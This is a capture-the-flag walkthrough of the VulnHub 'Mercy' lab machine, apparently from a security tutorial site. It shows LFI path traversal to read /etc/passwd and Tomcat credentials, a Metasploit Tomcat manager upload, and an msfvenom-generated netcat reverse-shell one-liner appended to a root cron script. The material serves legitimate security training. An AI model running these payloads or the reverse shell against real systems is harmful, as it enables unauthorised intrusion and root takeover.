@@ -1,0 +1,115 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Mercy: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/mercy-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-11-25T08:07:08+00:00">November 25, 2018</time><time class="updated" datetime="2025-06-10T20:11:56+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">MERCY is a machine dedicated to Offensive Security for the PWK course. MERCY is a name-play and has nothing to do with the contents of the vulnerable machine. You can download the Mercy vulnerable lab from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://drive.google.com/uc?id=1YzsW1lCKjo_WEr6Pk511DXQBFyMMR14y&amp;export=download">here</a></span>. The challenge is to get root on the Targeted Virtual Machine and read the proof.txt within that directory.</span></p>
+<p><span style="color: #000000;"><strong>Flag: </strong>Proof.txt</span></p>
+<h3><span style="color: #800000;"><strong>Tables of Contents:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">IP discovery and Port Scanning.</span></li>
+<li><span style="color: #000000;">Browsing the IP on port 8080.</span></li>
+<li><span style="color: #000000;">Decoding Base64 String.</span></li>
+<li><span style="color: #000000;">Using Enum4linux tool for enumerating information of the Target Machine.</span></li>
+<li><span style="color: #000000;">Getting Login Credentials to connect via smbclient.</span></li>
+<li><span style="color: #000000;">Port Knocking.</span></li>
+<li><span style="color: #000000;">Discovering accessible directories on the victim’s machine.</span></li>
+<li><span style="color: #000000;">Browsing through discovered directory’s.</span></li>
+<li><span style="color: #000000;">Searching exploits via searchsploit.</span></li>
+<li><span style="color: #000000;">Finding Login Credentials for Tomcat Server.</span></li>
+<li><span style="color: #000000;">Logging into Tomcat Server using Metasploit.</span></li>
+<li><span style="color: #000000;">Exploiting Misconfiguration in the Target Machine.</span></li>
+<li><span style="color: #000000;">Using Msfvenom for creating payload one-liner.</span></li>
+<li><span style="color: #000000;">Getting root access.</span></li>
+<li><span style="color: #000000;">Reading the flag.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Let’s Begin with the Walkthrough!!</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with scanning the network to find our targets IP.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-fIsbl-FAK7I/W_pU96cRxrI/AAAAAAAAbWo/qJYgMfOTENM_24WZKIAclY1N8VAtFk4MACEwYBhgL/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">We found our target IP –&gt; <strong>192.168.1.105</strong></span></p>
+<p><span style="color: #000000;">Our next motive is to scan the target IP with nmap.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.105</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xwHcHkzyXxw/W_pVAUz-hzI/AAAAAAAAbXU/_sWt5d6E1NYdoe6j_elSGzADnF0K7JsnQCEwYBhgL/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">The NMAP output shows various open ports: 22(ssh), 53(domain), 80(http), 110(pop3), 139(netbios-ssn), 143(imap), 445(netbios-ssn), 993(ssl/imaps), 995(ssl/pop3), 8080(http). </span></p>
+<p><span style="color: #000000;">Since port <strong>80 is filtered</strong> we cannot directly browse the Target IP in the Browser.  Further, we notice that <strong>port 8080 is open</strong> for<strong> Apache Tomcat/ Coyote JSP Engine 1.1.</strong> and here we got a clue as an entry <strong>/tryharder/tryharder</strong> in <strong>robot.txt</strong> as it might come in handy later on.</span></p>
+<p><span style="color: #000000;">So we browse the Target IP on port 8080 on the browser. WOW!! at the end of the web page you notice a path “/etc/tomcat7/tomcat-users.xml” where user-related information is defined. </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xGw6bdwbCmE/W_pVBjdzYQI/AAAAAAAAbXk/jUZAxBtXV1YQjwGXKsMh7X3-DnPv5prcwCEwYBhgL/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Hmmm!! On browsing through the discovered entry <strong>/tryharder/tryharder, </strong>it gave us a <strong>base64 encoded string. </strong></span></p>
+<p><span style="color: #000000;">Clearly! we need to decode it to move ahead.</span></p>
+<p><img decoding="async" src="https://3.bp.blogspot.com/-BxMNGGzbKQw/W_pVBmt44WI/AAAAAAAAbXo/y5CYcJ8mQVgv4Tj1eRQ1AuJoa_942dyHwCEwYBhgL/s1600/5.png"/></p>
+<p><span style="color: #000000;">On decoding the base64 string we found some Login Credentials which can be of great use later on.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-PDv8Cpbu978/W_pVCB1B2qI/AAAAAAAAbXs/3JKODaQJhTUzQfEt7vrlZQhMsy0R23sxACEwYBhgL/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Since port 445 is open on the Target Machine, We thought of enumerating it using <strong>enum4linux tool.</strong></span></p>
+<pre class="lang:default decode:true">enum4linux http://192.168.1.105</pre>
+<p><span style="color: #000000;">It gave us a few shared folders which can be further used to connect via <strong>smbclient.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nV8d94VJu4M/W_pVCSbgrpI/AAAAAAAAbXw/xb9o7caZonsyK11-vvhBKOjpUPWBISAvACEwYBhgL/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Now connecting via smbclient using credentials “qiu: password”.</span></p>
+<pre class="lang:default decode:true">smbclient \\\\192.168.1.105\\qiu -U qiu</pre>
+<p><span style="color: #000000;">Further exploring through directories we have downloaded the <strong>config</strong> file on our Linux Desktop.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-YRTPk30u8fw/W_pVChigg3I/AAAAAAAAbX0/elFD_VhcTSwFy6L53IMLHJNAW9eB5MOcACEwYBhgL/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Reading the contents of the <strong>config </strong>file gave us a sequence of ports to knock which will result in opening the <strong>http port 80</strong>.</span></p>
+<pre class="lang:default decode:true">cat config</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-C5xHl_gQARM/W_pVCvHFnII/AAAAAAAAbX4/o8xzhaqb2e4XGpK1QaFnAepjex9j56KFQCEwYBhgL/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Knocking the sequence of ports using the following command:</span></p>
+<pre class="lang:default decode:true">knock 192.168.1.105 159 27391 4
+nmap 192.168.1.105</pre>
+<p><span style="color: #000000;">Now from nmap scan, we confirmed that <strong>http port 80</strong> got open after knocking.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vE4R21rHCik/W_pU-H2WB9I/AAAAAAAAbWs/X2ElZdJfJMQ7zheudonyieN4H--iEktHQCEwYBhgL/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Since port 80 got open, we browsed the Target IP on the browser which displayed the message as you can see in the image, which came out to be useless to further proceed towards our goal.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IqW6WBCl0AE/W_pU-FdwbeI/AAAAAAAAbWw/1zc8xoxd9XQmZ1CQ4M2x_a2ZPSfqxPqwQCEwYBhgL/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Now we thought of enumerating for accessible directories on the Target Machine.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.105</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SG7s7_9kAV8/W_pU-qfV8hI/AAAAAAAAbW0/xK7SBVVmsBMZ1Ta_R34jURs95FKDle8uQCEwYBhgL/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">While browsing <strong>robots.txt</strong> file in the browser gave us two disallowed hidden directories as shown in the image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-g8a9se8bcM0/W_pU-_F4egI/AAAAAAAAbW4/OaFhO_dYyIgW6eggbT4XpR0xQ5ZuARrLQCEwYBhgL/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Browsing through the directory <strong>192.168.1.105/nomercy</strong> in the browser opened a vulnerability scanner webpage whose banner <strong>RIPS 0.53</strong> left us curious to search more about it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-euqRRk8f5mY/W_pU-ylF4SI/AAAAAAAAbW8/xBOY8REZXLkTEqWJ-9uzDCimoJsGTCUlACEwYBhgL/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Then while we search <strong>RIPS 0.53</strong> over <strong>searchsploit</strong>, it came out to be a <strong>Multiple Local File Inclusions Exploit. </strong>Next, we copied the exploit over our Linux Desktop and read the text file. Here we also copied the one-liner <strong>/windows/code.php?file=../../../../../../etc/passwd. </strong> <strong> </strong></span></p>
+<pre class="lang:default decode:true">searchsploit rips 0.53</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-zqbfUPb5frI/W_pU_RiQtvI/AAAAAAAAbXA/WMBUBC9B0Yocz0x49VGFZQaF8r79B41nQCEwYBhgL/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">We used LFI to take a look at the content of the passwd file as it was shown in the POC.</span></p>
+<pre class="lang:default decode:true">192.168.1.105/nomercy/windows/code.php?file=../../../../../../etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-GUSwqbm4fp0/W_pU_hQwIrI/AAAAAAAAbXE/p--Ssf_VjwYD80alA6ZKDqhdQKFxC6nmwCEwYBhgL/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Since we know there is a<strong> tomcat service </strong>running on the target system we can take a look the <strong>tomcat-users.xml </strong>file using LFI that will provide us with the username and password, exploring it on browser gave us <strong>two Login Credentials</strong> for <strong>Tomcat Server</strong> as shown on the image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-tI2HwFs97R4/W_pVAGOLH7I/AAAAAAAAbXM/R3wXOS91CdcSjj0be4JrPtYPnkf3b25-gCEwYBhgL/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Logging into Tomcat server using Metasploit’s Tomcat Manager using the following credentials “thisisasuperduperlonguser:heartbreakisinevitable<strong>”</strong></span></p>
+<pre class="lang:default decode:true">msf &gt; use exploit/multi/http/tomcat_mgr_upload
+msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhost 192.168.1.105
+msf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080
+msf exploit(multi/http/tomcat_mgr_upload) &gt; set httpusername thisisasuperduperlonguser
+msf exploit(multi/http/tomcat_mgr_upload) &gt; set httppassword heartbreakisinevitable
+msf exploit(multi/http/tomcat_mgr_upload) &gt; exploit</pre>
+<p><span style="color: #000000;">Now using a one-liner to spawn a tty shell:</span></p>
+<pre class="lang:default decode:true">python -c 'import pty; pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Further logging in as user fluffy.</span></p>
+<pre class="lang:default decode:true">su fluffy
+Password: freakishfluffybunny</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://3.bp.blogspot.com/-33g7DAj2nD0/W_pU_6OxqJI/AAAAAAAAbXI/PWhwfqukYfkdW94ZdnkWhZWDpDx1VmWEQCEwYBhgL/s1600/18.png"/></strong></span></p>
+<p>While traversing /home/fluffy/.private/secrets I notice a script “timeclock” to write the current date to /var/www/html/time that was owned by root and has FULL Permission.</p>
+<pre class="lang:default decode:true">cd /home
+ls
+cd fluffy
+ls -la
+cd .private
+ls -la
+cd secrets</pre>
+<p><span style="color: #000000;">Since the script will run every three-minute after, so we decide to edit this file by inserting our malicious code in it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dP2p9ulrblk/W_pVAb30g8I/AAAAAAAAbXQ/rqwDze88620GVYjKassrbf5spc4i-_ZYQCEwYBhgL/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Moving on!! We need to create a bash code using Msfvenom:</span></p>
+<pre class="lang:default decode:true">msfvenom –p cmd/unix/reverse_netcat lhost=192.168.1.109 lport=8888 R</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zSv_cqkRwmY/W_pVAsdE5iI/AAAAAAAAbXY/90I0BoLzKPYvVyGnKOVlvr7x-tw4vIXngCEwYBhgL/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">After that append the above-generated code in the <strong>timeclock</strong> file.</span></p>
+<pre class="lang:default decode:true">echo "mkfifo /tmpmzlat; nc 192.168.1.109 8888 0&lt;/tmp/zlat | /bin/sh &gt;/tmp/zlat 2&gt;&amp;1; rm /tmp/zlat" &gt;&gt;timclock</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ropHFXurS3k/W_pVBKKC5dI/AAAAAAAAbXc/yAm7hNwk4Y4DP5rX2Pd5GgzBx_nzEkX_gCEwYBhgL/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">Since the malicious code got executed with the timeclock file. Therefore we got a reverse shell on our netcat listener. To spawn the shell we have used python bin bash one-liner.<strong> </strong></span></p>
+<pre class="lang:default decode:true ">python -c 'import pty; pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Booyah!! We have got the root access and found proof.txt. We take a look at the content of the file and greeted with a congratulatory message.  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ms5-Sc4yLj4/W_pVBb6_lxI/AAAAAAAAbXg/392cF1qRyYQdQ125jO7SaypNSsHFp6AYgCEwYBhgL/s1600/22.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 2 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/"><strong>Here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
